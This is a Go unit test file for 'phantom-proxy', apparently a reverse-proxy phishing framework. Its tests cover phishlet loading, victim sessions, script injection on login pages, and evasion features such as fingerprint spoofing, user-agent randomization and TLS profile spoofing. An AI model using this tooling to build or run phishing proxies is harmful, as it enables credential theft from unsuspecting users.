package proxy

import (
	"context"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
	"os"
	"path/filepath"

	"github.com/phantom-proxy/phantom-proxy/internal/config"
	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"github.com/phantom-proxy/phantom-proxy/internal/tls"
	"go.uber.org/zap"
)

func TestNewHTTPProxy(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()

	cfg := &config.Config{
		Domain:         "test.local",
		HTTPSPort:      8443,
		BindIP:         "0.0.0.0",
		CertPath:       "",
		KeyPath:        "",
		DatabasePath:   ":memory:",
		PhishletsPath:  "", // disable for tests
		JA3Enabled:     false,
		PolymorphicEnabled: false,
		ServiceWorkerEnabled: false,
		WebSocketEnabled: false,
		MLDetection:    false,
	}

	db, err := database.NewDatabase(&database.DatabaseConfig{
		Type:       database.DatabaseSQLite,
		SQLitePath: ":memory:",
	}, logger)
	if err != nil {
		t.Logf("unable to create sqlite DB (CGO?): %v, proceeding with nil db", err)
		db = nil
	} else {
		defer db.Close()
	}

	proxy, err := NewHTTPProxy(cfg, db, nil, logger)
	if err != nil {
		t.Fatalf("Failed to create HTTP proxy: %v", err)
	}
	defer proxy.Close()

	if proxy == nil {
		t.Fatal("Expected proxy to be created")
	}
}

func TestProxySession(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()

	cfg := &config.Config{
		Domain:       "test.local",
		HTTPSPort:    8443,
		BindIP:       "0.0.0.0",
		DatabasePath: ":memory:",
		PhishletsPath: "",
	}

	db, err := database.NewDatabase(&database.DatabaseConfig{
		Type:       database.DatabaseSQLite,
		SQLitePath: ":memory:",
	}, logger)
	if err != nil {
		db = nil
	} else {
		defer db.Close()
	}

	proxy, err := NewHTTPProxy(cfg, db, nil, logger)
	if err != nil {
		t.Fatalf("Failed to create HTTP proxy: %v", err)
	}
	defer proxy.Close()

	// Create test session
	session := &ProxySession{
		ID:         "test-session-1",
		VictimIP:   "192.168.1.1",
		TargetHost: "example.com",
		CreatedAt:  time.Now(),
		LastActive: time.Now(),
	}

	// Test session methods
	if session.ID != "test-session-1" {
		t.Errorf("Expected session ID to be test-session-1, got %s", session.ID)
	}

	if session.VictimIP != "192.168.1.1" {
		t.Errorf("Expected victim IP to be 192.168.1.1, got %s", session.VictimIP)
	}
}

func TestProxyReverseProxy(t *testing.T) {
	logger, _ := zap.NewDevelopment()

	// Create test target server
	target := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
	}))
	defer target.Close()

	cfg := &config.Config{
		Domain:       "test.local",
		HTTPSPort:    8443,
		BindIP:       "0.0.0.0",
		DatabasePath: ":memory:",
		PhishletsPath: "",
	}

	db, err := database.NewDatabase(&database.DatabaseConfig{
		Type:       database.DatabaseSQLite,
		SQLitePath: ":memory:",
	}, logger)
	if err != nil {
		db = nil
	} else {
		defer db.Close()
	}

	proxy, err := NewHTTPProxy(cfg, db, nil, logger)
	if err != nil {
		t.Fatalf("Failed to create HTTP proxy: %v", err)
	}
	defer proxy.Close()

	// Test that proxy can handle requests
	ctx := context.Background()
	req := httptest.NewRequest("GET", "http://test.local/test", nil)
	req = req.WithContext(ctx)

	w := httptest.NewRecorder()

	// Proxy should handle the request without panicking
	proxy.ServeHTTP(w, req)

	// We expect either OK or error depending on proxy configuration
	// Main test is that it doesn't crash
}

// ensure that UA randomization works when enabled
func TestUserAgentRandomization(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()

	cfg := &config.Config{
		Domain:            "test.local",
		HTTPSPort:         8443,
		BindIP:            "0.0.0.0",
		DatabasePath:      ":memory:",
		PhishletsPath:     "",
		RandomizeUserAgent: true,
		UserAgents: []string{"A", "B", "C"},
	}

	db, err := database.NewDatabase(&database.DatabaseConfig{
		Type:       database.DatabaseSQLite,
		SQLitePath: ":memory:",
	}, logger)
	if err != nil {
		db = nil
	} else {
		defer db.Close()
	}

	proxy, err := NewHTTPProxy(cfg, db, nil, logger)
	if err != nil {
		t.Fatalf("Failed to create HTTP proxy: %v", err)
	}
	defer proxy.Close()

	req := httptest.NewRequest("GET", "https://test.local/test", nil)
	req.RemoteAddr = "192.0.2.1:1234" // ensure getClientIP returns a value
	req.Header.Set("User-Agent", "original")

	w := httptest.NewRecorder()
	proxy.ServeHTTP(w, req)

	// proxy.getSessionFromContext may rely on RemoteAddr, so just inspect the internal map
	if len(proxy.sessions) == 0 {
		t.Fatalf("expected at least one session to be created")
	}
	var ua string
	for _, s := range proxy.sessions {
		ua = s.UserAgent
		break
	}
	if ua != "A" && ua != "B" && ua != "C" {
		t.Errorf("expected randomized UA from list, got %s", ua)
	}
}

// verify that JavaScript injections respect trigger conditions
func TestJSInjectionTrigger(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()

	cfg := &config.Config{
		Domain:       "test.local",
		HTTPSPort:    8443,
		BindIP:       "0.0.0.0",
		DatabasePath: ":memory:",
		PhishletsPath: "",
	}
	db, err := database.NewDatabase(&database.DatabaseConfig{
		Type:       database.DatabaseSQLite,
		SQLitePath: ":memory:",
	}, logger)
	if err != nil {
		db = nil
	} else {
		defer db.Close()
	}

	proxy, _ := NewHTTPProxy(cfg, db, nil, logger)
	if proxy == nil {
		t.Fatal("expected proxy object")
	}
	defer proxy.Close()

	// add a dummy phishlet with a JS injection to the proxy state
	proxy.phishlets = map[string]*Phishlet{
		"test": {
			JSInjections: []JSInjection{
				{
					TriggerDomains: []string{"example.com"},
					TriggerPaths:   []string{"login"},
					Script:         "alert(1)",
				},
			},
		},
	}

	session := &ProxySession{PhishletID: "test"}
	req := httptest.NewRequest("GET", "https://example.com/login?foo=1", nil)
	script := proxy.generateScript(session, req)
	if !strings.Contains(script, "alert(1)") {
		t.Errorf("expected injection script when conditions met")
	}

	req2 := httptest.NewRequest("GET", "https://foo.com/other", nil)
	script2 := proxy.generateScript(session, req2)
	if script2 != "" {
		t.Errorf("expected no script for non matching request")
	}
}

// additional unit tests added later
func TestNormalizeHeaders(t *testing.T) {
	req := httptest.NewRequest("GET", "http://test.local/foo", nil)
	if req.Header.Get("Accept-Language") != "" {
		t.Fatal("expected empty Accept-Language")
	}
	normalizeHeaders(req)
	if req.Header.Get("Accept-Language") != "en-US,en;q=0.5" {
		t.Errorf("Unexpected Accept-Language %s", req.Header.Get("Accept-Language"))
	}
	if req.Header.Get("Accept-Encoding") == "" {
		t.Error("Accept-Encoding should be set")
	}
	if req.Header.Get("Accept") == "" {
		t.Error("Accept should be set")
	}
	if req.Header.Get("Connection") == "" {
		t.Error("Connection should be set")
	}

	// exercise director normalization flag
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()
	cfg := &config.Config{NormalizeHeaders: true, PhishletsPath: ""}
	proxy, _ := NewHTTPProxy(cfg, nil, nil, logger)

	// create dummy session so director logging doesn't panic
	proxy.sessions = map[string]*ProxySession{"1": {ID: "1"}}
	proxy.sessionIndex = map[string]string{"127.0.0.1": "1"}

	req2 := httptest.NewRequest("GET", "http://foo", nil)
	req2.RemoteAddr = "127.0.0.1:1234"
	proxy.director(req2)
	if req2.Header.Get("Accept-Language") == "" {
		t.Error("director should normalize headers")
	}
}

func TestLoadTLSConfig(t *testing.T) {
	cfg, err := loadTLSConfig("", "")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfg == nil {
		t.Fatal("expected non-nil config")
	}
	_, err = loadTLSConfig("/nope.pem", "/nope.key")
	if err == nil {
		t.Error("expected error for missing files")
	}
}

func TestLoadPhishletsEmpty(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	cfg := &config.Config{PhishletsPath: ""}
	proxy, err := NewHTTPProxy(cfg, nil, nil, logger)
	if err != nil {
		t.Fatalf("failed to create proxy: %v", err)
	}
	if len(proxy.phishlets) != 0 {
		t.Errorf("expected 0 phishlets, got %d", len(proxy.phishlets))
	}
}

func TestPolymorphicQuery(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()
	cfg := &config.Config{PolymorphicEnabled: true, PhishletsPath: ""}
	proxy, _ := NewHTTPProxy(cfg, nil, nil, logger)
	// provide fake session to satisfy director logging
	proxy.sessions = map[string]*ProxySession{"1": {ID: "1"}}
	proxy.sessionIndex = map[string]string{"127.0.0.1": "1"}

	req := httptest.NewRequest("GET", "http://test.local/path", nil)
	req.RemoteAddr = "127.0.0.1:1234"
	proxy.director(req)
	if req.URL.Query().Get("__phantom") == "" {
		t.Error("expected polymorphic query parameter")
	}
}

func TestCanvasSpoofInjection(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()
	cfg := &config.Config{CanvasSpoofEnabled: true, PhishletsPath: ""}
	proxy, _ := NewHTTPProxy(cfg, nil, nil, logger)

	html := []byte("<html><body>Hello</body></html>")
	out := proxy.injectJavaScript(html, nil, httptest.NewRequest("GET", "http://a", nil))
	content := string(out)
	if !strings.Contains(content, "HTMLCanvasElement.prototype.toDataURL") {
		t.Error("expected canvas spoof script injected")
	}
	if !strings.Contains(content, "WebGLRenderingContext.prototype.getParameter") {
		t.Error("expected WebGL spoof script injected")
	}
}

// fakeTLSDialer implements TLSDialer for testing purposes

type fakeTLSDialer struct {
	called bool
}

func (f *fakeTLSDialer) Dial(network, addr string) (net.Conn, error) {
	f.called = true
	c1, _ := net.Pipe()
	return c1, nil
}

func TestTransportUsesTLSDialer(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()
	fake := &fakeTLSDialer{}
	proxy := &HTTPProxy{tlsManager: fake}
	transport := proxy.createTransport()
	dial := transport.DialTLSContext
	if dial == nil {
		t.Fatal("expected DialTLSContext to be set")
	}
	conn, err := dial(context.Background(), "tcp", "example.com:443")
	if err != nil {
		t.Fatalf("dial failed: %v", err)
	}
	conn.Close()
	if !fake.called {
		t.Error("expected fake dialer to be invoked")
	}
}

func TestLoadPhishletsFromDir(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()

	tmpDir, err := os.MkdirTemp("", "phishlets")
	if err != nil {
		t.Fatalf("failed to create tmp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	// write a simple YAML phishlet file
	content := `id: sample
proxy_hosts:
  - phish_sub: ""
    orig_sub: "example"
    domain: "com"
js_inject: []`
	if err := os.WriteFile(filepath.Join(tmpDir, "sample.yaml"), []byte(content), 0644); err != nil {
		t.Fatalf("failed to write phishlet: %v", err)
	}

	cfg := &config.Config{PhishletsPath: tmpDir}
	proxy, err := NewHTTPProxy(cfg, nil, nil, logger)
	if err != nil {
		t.Fatalf("NewHTTPProxy error: %v", err)
	}
	if len(proxy.phishlets) != 1 {
		t.Errorf("expected 1 phishlet, got %d", len(proxy.phishlets))
	}
	if _, ok := proxy.phishlets["sample"]; !ok {
		t.Error("phishlet 'sample' not loaded")
	}
}

// SpoofManager tests
func TestSpoofManagerRegisters(t *testing.T) {
	sm := tls.NewSpoofManager()
	if sm == nil {
		t.Fatal("expected non-nil SpoofManager")
	}
	// make sure SelectProfile returns something reasonable
	profile := sm.SelectProfile()
	if profile == nil {
		t.Error("SelectProfile returned nil")
	}
	// dialing against localhost should not panic even if it errors
	conn, err := sm.Dial("tcp", "127.0.0.1:0")
	if err == nil && conn != nil {
		// expected a SpoofedConnection when dial succeeds
		if _, ok := conn.(*tls.SpoofedConnection); !ok {
			t.Error("expected SpoofedConnection type")
		}
		conn.Close()
	}
}

func TestEnableDisablePhishlet(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()

	tmpDir, err := os.MkdirTemp("", "phishlets")
	if err != nil {
		t.Fatalf("failed to create tmp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	// write a simple YAML phishlet file
	content := `id: sample
proxy_hosts:
  - phish_sub: ""
    orig_sub: "example"
    domain: "com"
js_inject: []`
	if err := os.WriteFile(filepath.Join(tmpDir, "sample.yaml"), []byte(content), 0644); err != nil {
		t.Fatalf("failed to write phishlet: %v", err)
	}

	// prepare database
	db, err := database.NewDatabase(&database.DatabaseConfig{
		Type:       database.DatabaseSQLite,
		SQLitePath: ":memory:",
	}, logger)
	if err != nil {
		t.Logf("unable to create sqlite DB (CGO?): %v, proceeding with nil db", err)
		db = nil
	} else {
		defer db.Close()
	}

	cfg := &config.Config{PhishletsPath: tmpDir}
	proxy, err := NewHTTPProxy(cfg, db, nil, logger)
	if err != nil {
		t.Fatalf("NewHTTPProxy error: %v", err)
	}

	ph, ok := proxy.phishlets["sample"]
	if !ok {
		t.Fatal("phishlet 'sample' not loaded")
	}
	if ph.Enabled {
		t.Error("expected default phishlet to be disabled")
	}

	if err := proxy.EnablePhishlet("sample"); err != nil {
		t.Fatalf("EnablePhishlet failed: %v", err)
	}
	if !ph.Enabled {
		t.Error("phishlet should be enabled in memory")
	}
	if db != nil {
		dbPh, err := db.GetPhishlet(ph.ID)
		if err != nil {
			t.Fatalf("db GetPhishlet failed: %v", err)
		}
		if !dbPh.Enabled {
			t.Error("phishlet should be enabled in database")
		}
	}

	if err := proxy.DisablePhishlet("sample"); err != nil {
		t.Fatalf("DisablePhishlet failed: %v", err)
	}
	if ph.Enabled {
		t.Error("phishlet should be disabled after call")
	}
	if db != nil {
		dbPh, err := db.GetPhishlet(ph.ID)
		if err != nil {
			t.Fatalf("db GetPhishlet failed: %v", err)
		}
		if dbPh.Enabled {
			t.Error("phishlet should be disabled in database")
		}
	}
}

func TestStatsEmpty(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()

	cfg := &config.Config{
		Domain:       "test.local",
		HTTPSPort:    8443,
		BindIP:       "0.0.0.0",
		DatabasePath: ":memory:",
		PhishletsPath: "",
	}

	db, err := database.NewDatabase(&database.DatabaseConfig{
		Type:       database.DatabaseSQLite,
		SQLitePath: ":memory:",
	}, logger)
	if err != nil {
		db = nil
	} else {
		defer db.Close()
	}

	proxy, err := NewHTTPProxy(cfg, db, nil, logger)
	if err != nil {
		t.Fatalf("NewHTTPProxy error: %v", err)
	}

defer proxy.Close()

	stats := proxy.GetStats()
	if total, ok := stats["total_requests"].(int64); !ok || total != 0 {
		t.Errorf("expected 0 requests, got %v", stats["total_requests"])
	}
	if loaded, ok := stats["phishlets_loaded"].(int); !ok || loaded != 0 {
		t.Errorf("expected 0 phishlets, got %v", stats["phishlets_loaded"])
	}
}

func TestStatsAfterSession(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()

	cfg := &config.Config{
		Domain:       "test.local",
		HTTPSPort:    8443,
		BindIP:       "0.0.0.0",
		DatabasePath: ":memory:",
		PhishletsPath: "",
	}

	db, err := database.NewDatabase(&database.DatabaseConfig{
		Type:       database.DatabaseSQLite,
		SQLitePath: ":memory:",
	}, logger)
	if err != nil {
		db = nil
	} else {
		defer db.Close()
	}

	proxy, err := NewHTTPProxy(cfg, db, nil, logger)
	if err != nil {
		t.Fatalf("NewHTTPProxy error: %v", err)
	}
	defer proxy.Close()

	// exercise the proxy to create a session
	req := httptest.NewRequest("GET", "https://test.local/hello", nil)
	rec := httptest.NewRecorder()
	proxy.ServeHTTP(rec, req)

	stats := proxy.GetStats()
	if total, ok := stats["total_requests"].(int64); !ok || total < 1 {
		t.Errorf("expected at least 1 request, got %v", stats["total_requests"])
	}
	if active, ok := stats["active_sessions"].(int); !ok || active < 1 {
		t.Errorf("expected at least 1 active session, got %v", stats["active_sessions"])
	}
}

func TestCheckPhishletHealth(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()

	cfg := &config.Config{
		Domain:       "test.local",
		HTTPSPort:    8443,
		BindIP:       "0.0.0.0",
		DatabasePath: ":memory:",
		PhishletsPath: "",
	}

	db, err := database.NewDatabase(&database.DatabaseConfig{
		Type:       database.DatabaseSQLite,
		SQLitePath: ":memory:",
	}, logger)
	if err != nil {
		db = nil
	} else {
		defer db.Close()
	}

	proxy, err := NewHTTPProxy(cfg, db, nil, logger)
	if err != nil {
		t.Fatalf("NewHTTPProxy error: %v", err)
	}
	defer proxy.Close()

	// add a dummy phishlet with no hosts to avoid network
	proxy.phishlets["healthtest"] = &Phishlet{ID: "healthtest"}

	health := proxy.CheckPhishletHealth("healthtest")
	if health["status"] != "healthy" {
		t.Errorf("expected healthy status, got %v", health["status"])
	}
}

func TestServiceWorkerToggle(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()
	cfg := &config.Config{ServiceWorkerEnabled: false, PhishletsPath: ""}
	proxy, _ := NewHTTPProxy(cfg, nil, nil, logger)

	req := httptest.NewRequest("GET", "https://test.local/sw.js", nil)
	w := httptest.NewRecorder()
	proxy.ServeHTTP(w, req)
	if w.Code == http.StatusOK && strings.Contains(w.Body.String(), "PhantomProxy Service Worker") {
		t.Error("did not expect SW script when service worker disabled")
	}

	cfg.ServiceWorkerEnabled = true
	proxy2, _ := NewHTTPProxy(cfg, nil, nil, logger)
	w2 := httptest.NewRecorder()
	req2 := httptest.NewRequest("GET", "https://test.local/sw.js", nil)
	proxy2.ServeHTTP(w2, req2)
	if w2.Code != http.StatusOK || !strings.Contains(w2.Body.String(), "PhantomProxy Service Worker") {
		t.Errorf("expected SW JS when enabled, got %d %s", w2.Code, w2.Body.String())
	}
}
